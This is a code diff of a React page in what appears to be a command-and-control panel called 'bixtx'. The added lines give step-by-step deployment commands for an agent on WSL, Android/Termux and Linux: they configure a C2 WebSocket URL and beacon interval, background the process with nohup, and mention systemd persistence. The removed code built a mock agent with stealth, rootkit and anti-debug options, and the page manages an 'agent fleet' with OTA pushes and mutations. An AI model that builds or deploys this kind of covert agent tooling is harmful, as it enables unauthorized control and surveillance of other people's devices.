+                  <div style={{ color:"#b8cce8" }}>curl -fsSL https://deb.nodesource.com/setup_20.x | sudo bash -</div>
+                  <div style={{ color:"#b8cce8" }}>sudo apt install -y nodejs</div>
+                  <div style={{ color:"#6b8ab0" }}># 3. Transfer software-a/ into WSL, then:</div>
+                  <div style={{ color:"#b8cce8" }}>cd software-a && npm install --omit=dev</div>
+                  <div style={{ color:"#b8cce8" }}>{`printf 'C2_WS_URL=${c2Endpoint}\\nBEACON_INTERVAL=${beaconInterval}\\n' > .env`}</div>
+                  <div style={{ color:"#b8cce8" }}>node src/index.js</div>
+                </>) : targetOS === "android" ? (<>
+                  <div style={{ color:"#6b8ab0" }}># 1. Install Termux from F-Droid (not Play Store)</div>
+                  <div style={{ color:"#6b8ab0" }}># 2. In Termux:</div>
+                  <div style={{ color:"#b8cce8" }}>pkg update -y && pkg install -y nodejs</div>
+                  <div style={{ color:"#6b8ab0" }}># 3. Transfer software-a/ via adb push or scp, then:</div>
+                  <div style={{ color:"#b8cce8" }}>cd software-a && npm install --omit=dev</div>
+                  <div style={{ color:"#b8cce8" }}>{`printf 'C2_WS_URL=${c2Endpoint}\\nBEACON_INTERVAL=${beaconInterval}\\n' > .env`}</div>
+                  <div style={{ color:"#b8cce8" }}>nohup node src/index.js &gt; /tmp/bixtx.log 2&gt;&amp;1 &amp;</div>
+                </>) : (<>
+                  <div style={{ color:"#6b8ab0" }}># 1. Requires Node.js 18+</div>
+                  <div style={{ color:"#b8cce8" }}>cd software-a</div>
+                  <div style={{ color:"#b8cce8" }}>npm install --omit=dev</div>
+                  <div style={{ color:"#6b8ab0" }}># 2. Configure:</div>
+                  <div style={{ color:"#b8cce8" }}>{`printf 'C2_WS_URL=${c2Endpoint}\\nBEACON_INTERVAL=${beaconInterval}\\nLOG_LEVEL=info\\n' > .env`}</div>
+                  <div style={{ color:"#6b8ab0" }}># 3. Run:</div>
+                  <div style={{ color:"#b8cce8" }}>node src/index.js</div>
+                  <div style={{ color:"#10b981" }}># Optional: run as systemd service for persistence</div>
+                </>)}
               </div>
             </div>
-
-            {built && !building && buildOS && (
-              <div className="rounded-2xl p-4 flex items-center justify-between"
-                style={{ background:"rgba(16,185,129,0.07)", border:"1px solid rgba(16,185,129,0.3)" }}>
-                <div className="flex items-center gap-3">
-                  <div className="w-10 h-10 rounded-lg flex items-center justify-center" style={{ background:"rgba(16,185,129,0.15)" }}>
-                    <Check size={18} color="#10b981" />
-                  </div>
-                  <div>
-                    <div className="text-sm font-bold" style={{ color:"#10b981" }}>Agent Ready</div>
-                    <div className="text-xs font-mono" style={{ color:"#6b8ab0" }}>
-                      bixtx-agent-v4.7.2-{buildOS}{buildOS==="windows"?".exe":buildOS==="macos"?".pkg":buildOS==="linux"?".deb":buildOS==="android"?".apk":buildOS==="ios"?".ipa":".hap"}
-                    </div>
-                  </div>
-                </div>
-                <div className="flex gap-2">
-                  <button onClick={() => {
-                    const ext = buildOS==="windows"?".exe":buildOS==="macos"?".pkg":buildOS==="linux"?".deb":buildOS==="android"?".apk":buildOS==="ios"?".ipa":".hap";
-                    const filename = `bixtx-agent-v4.7.2-${buildOS}${ext}`;
-                    const enabled = Object.entries(modules).filter(([,v])=>v).map(([k])=>k).join(",");
-                    const content = `[bixtx Agent Binary]\nOS: ${buildOS}\nVersion: 4.7.2\nStealth: ${stealthLevel}\nPersistence: ${persistence}\nC2: ${c2Endpoint}\nBeacon: ${beaconInterval}s\nRootkit: ${rootkitDepth}\nAnti-Debug: ${antiDebug}\nModules: ${enabled}\nBuilt: ${new Date().toISOString()}`;
-                    const blob = new Blob([content], { type:"application/octet-stream" });
-                    const url = URL.createObjectURL(blob);
-                    const a = document.createElement("a");
-                    a.href = url; a.download = filename; a.click();
-                    URL.revokeObjectURL(url);
-                    show(`${filename} downloaded`, "success");
-                  }}
-                    className="flex items-center gap-1.5 px-3 py-2 rounded-lg text-xs font-bold transition-all hover:opacity-90"
-                    style={{ background:"#10b981", color:"#000" }}>
-                    <Download size={12} /> Download
-                  </button>
-                  <button onClick={() => setTab("deploy")}
-                    className="flex items-center gap-1.5 px-3 py-2 rounded-lg text-xs font-bold transition-all"
-                    style={{ background:"rgba(59,130,246,0.2)", color:"#3b82f6", border:"1px solid rgba(59,130,246,0.4)" }}>
-                    Deploy <ArrowRight size={12} />
-                  </button>
-                </div>
-              </div>
-            )}
 
             <div className="rounded-2xl p-4" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.2)" }}>
               <div className="text-xs font-mono uppercase tracking-widest mb-3" style={{ color:"#6b8ab0" }}>Agent Specifications</div>
               <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
                 {[
-                  { label:"Binary Size",  val:"~14 MB",           icon:<HardDrive size={13} />, color:"#3b82f6" },
-                  { label:"RAM Usage",    val:"<3 MB idle",       icon:<Cpu size={13} />,       color:"#10d9a0" },
-                  { label:"CPU Load",     val:"<0.1% idle",       icon:<Activity size={13} />,  color:"#10b981" },
-                  { label:"Encryption",   val:"AES-256-GCM",      icon:<Lock size={13} />,      color:"#f59e0b" },
-                  { label:"Protocol",     val:"HTTPS + WS",       icon:<WifiIcon size={13} />,  color:"#3b82f6" },
-                  { label:"Persistence",  val:persistence,        icon:<Server size={13} />,    color:"#10d9a0" },
-                  { label:"Rootkit",      val:rootkitDepth,       icon:<Shield size={13} />,    color:"#ef4444" },
-                  { label:"Beacon",       val:`${beaconInterval}s`, icon:<Signal size={13} />, color:"#10b981" },
+                  { label:"Runtime",    val:"Node.js 18+",     icon:<Server size={13} />,    color:"#10b981" },
+                  { label:"Protocol",   val:"WebSocket / WSS", icon:<WifiIcon size={13} />,  color:"#3b82f6" },
+                  { label:"Encryption", val:"AES-256-GCM",     icon:<Lock size={13} />,      color:"#f59e0b" },
+                  { label:"Beacon",     val:`${beaconInterval}s interval`, icon:<Signal size={13} />, color:"#10d9a0" },
+                  { label:"CPU Impact", val:"<1% idle",        icon:<Activity size={13} />,  color:"#10b981" },
+                  { label:"DB",         val:"SQLite encrypted", icon:<HardDrive size={13} />, color:"#a855f7" },
+                  { label:"Platforms",  val:"Linux · macOS · WSL · Termux · iOS · HarmonyOS", icon:<Cpu size={13} />, color:"#3b82f6" },
+                  { label:"Persistence",val:"systemd / launchd", icon:<Shield size={13} />, color:"#10d9a0" },
                 ].map(s => (
                   <div key={s.label} className="rounded-lg p-3" style={{ background:"#030b16", border:"1px solid rgba(59,130,246,0.12)" }}>
                     <div className="flex items-center gap-1.5 mb-1" style={{ color:s.color }}>{s.icon}
@@ -501,7 +582,9 @@ export function LinkAgentPage({ show }: { show: (msg: string, kind?: "success"|"
         <div className="space-y-4">
           <div className="rounded-2xl overflow-hidden" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.2)" }}>
             <div className="px-5 py-3 border-b flex items-center justify-between" style={{ borderColor:"rgba(59,130,246,0.15)" }}>
-              <div className="text-xs font-mono uppercase tracking-widest" style={{ color:"#6b8ab0" }}>Active Agent Fleet — {FLEET.length} nodes</div>
+              <div className="text-xs font-mono uppercase tracking-widest" style={{ color:"#6b8ab0" }}>
+                Active Agent Fleet — {fleetLoading ? "loading…" : `${FLEET.length} node${FLEET.length !== 1 ? "s" : ""}`}
+              </div>
               <div className="flex gap-2">
                 <button onClick={() => show("OTA update pushed to all active agents", "success")}
                   className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-bold"
@@ -516,6 +599,18 @@ export function LinkAgentPage({ show }: { show: (msg: string, kind?: "success"|"
               </div>
             </div>
             <div className="divide-y divide-purple-500/10">
+              {fleetLoading && (
+                <div className="px-5 py-8 text-center text-sm font-mono" style={{ color:"#6b8ab0" }}>
+                  <RefreshCw size={14} className="animate-spin inline mr-2"/>Loading live fleet data…
+                </div>
+              )}
+              {!fleetLoading && FLEET.length === 0 && (
+                <div className="px-5 py-10 text-center" style={{ color:"#6b8ab0" }}>
+                  <Signal size={24} className="mx-auto mb-3 opacity-30"/>
+                  <div className="text-sm font-mono">No agents connected</div>
+                  <div className="text-[10px] mt-1">Enroll a device using a deployment link or QR code</div>
+                </div>
+              )}
               {FLEET.map(agent => (
                 <div key={agent.id} className="px-5 py-3 flex flex-wrap items-center gap-4">
                   <div className="flex items-center gap-3 flex-1 min-w-48">
@@ -707,6 +802,12 @@ export function LinkAgentPage({ show }: { show: (msg: string, kind?: "success"|"
               <span className="text-xs font-mono uppercase tracking-widest" style={{ color:"#6b8ab0" }}>Mutation Log</span>
             </div>
             <div className="divide-y divide-purple-500/10 overflow-y-auto max-h-[600px]">
+              {mutLog.length === 0 && (
+                <div className="px-5 py-10 text-center" style={{ color:"#6b8ab0" }}>
+                  <div className="text-sm font-mono">No mutations yet</div>
+                  <div className="text-[10px] mt-1">Execute a global mutation to see the log here</div>
+                </div>
+              )}
               {mutLog.map((entry, i) => (
                 <div key={i} className="px-5 py-3">
                   <div className="flex items-center justify-between mb-1">
